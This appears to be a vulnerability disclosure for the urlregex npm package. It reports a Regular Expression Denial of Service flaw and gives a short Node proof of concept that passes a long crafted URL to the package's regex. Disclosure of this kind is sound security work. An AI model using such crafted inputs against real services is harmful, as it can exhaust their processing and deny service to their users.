# Overview

urlregex

> No-dependency URL validation for Node and the browser.

This package is vulnerable to Regular Expression Denial of Service (ReDoS). An attacker providing a long string in `String.test` can cause a Denial of Service attack.

## Proof of Concept

```node
const urlRegex = require("urlregex");
const isValid = urlRegex().test(
  "http://huntr.devtestvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321"
);

console.log(isValid);
```
